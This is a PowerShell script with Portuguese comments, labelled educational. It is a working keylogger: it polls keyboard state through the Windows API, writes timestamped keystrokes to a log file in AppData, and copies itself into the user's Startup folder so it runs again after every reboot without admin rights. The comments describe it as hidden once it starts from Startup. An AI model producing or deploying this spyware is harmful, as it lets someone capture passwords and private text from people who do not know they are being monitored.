# Monitor Teclas STARTUP v1.0 - SEM ADMIN!
# EDUCACIONAL - Persiste no Reboot!
param($LogPath="$env:APPDATA\teclas.log")

Write-Host "🎹 Monitor Teclas STARTUP (SEM ADMIN)!" -ForegroundColor Green

# 1. Windows API Global (sem bloqueio)
Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
}
"@

# 2. Mapa teclas (alfanumérico)
$teclas = @{
    65='a';66='b';67='c';68='d';69='e';70='f';71='g';72='h';73='i';74='j';
    75='k';76='l';77='m';78='n';79='o';80='p';81='q';82='r';83='s';84='t';
    85='u';86='v';87='w';88='x';89='y';90='z';186=';';188=',';190='.';191='/';
    32=' ';13='[ENTER]';8='[BACKSPACE]'
}

# 3. CRIA pasta log
New-Item -ItemType Directory -Force -Path (Split-Path $LogPath) | Out-Null

# 4. COPIA pra STARTUP (persiste reboot!)
$StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\monitor-teclas.ps1"
$ScriptPath = $MyInvocation.MyCommand.Path

if (!(Test-Path $StartupPath)) {
    Copy-Item $ScriptPath $StartupPath -Force
    Write-Host "✅ COPIADO pra STARTUP!" -ForegroundColor Green
    Write-Host "🔄 Inicia AUTOMATICAMENTE no reboot!" -ForegroundColor Green
} else {
    Write-Host "✅ JÁ está no STARTUP!" -ForegroundColor Yellow
}

Write-Host "📝 Log: $LogPath" -ForegroundColor Yellow
Write-Host "🛑 REMOVER: del `"$StartupPath`"" -ForegroundColor Red

# 5. FUNÇÃO MONITOR (invisível após startup)
function Start-Monitor {
    $buffer = @(); $estadoAnterior = @{}
    
    while($true) {
        foreach($vkCode in $teclas.Keys) {
            $estado = [WinAPI]::GetAsyncKeyState($vkCode)
            $pressionada = ($estado -band 0x8000)
            
            if($pressionada -and !$estadoAnterior[$vkCode]) {
                $char = $teclas[$vkCode]
                $buffer += $char
                
                if($char -eq '[ENTER]' -or $buffer.Count -ge 12) {
                    $texto = ($buffer -join '').Trim()
                    if($texto) {
                        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') → $texto" | Out-File $LogPath -Append -Encoding UTF8
                    }
                    $buffer = @()
                }
            }
            $estadoAnterior[$vkCode] = $pressionada
        }
        Start-Sleep -Milliseconds 20
    }
}

# 6. INICIA (visível no teste, oculto no startup)
Write-Host "`n🎹 Iniciando... Digite no navegador! (Ctrl+C)" -ForegroundColor Cyan
Start-Monitor
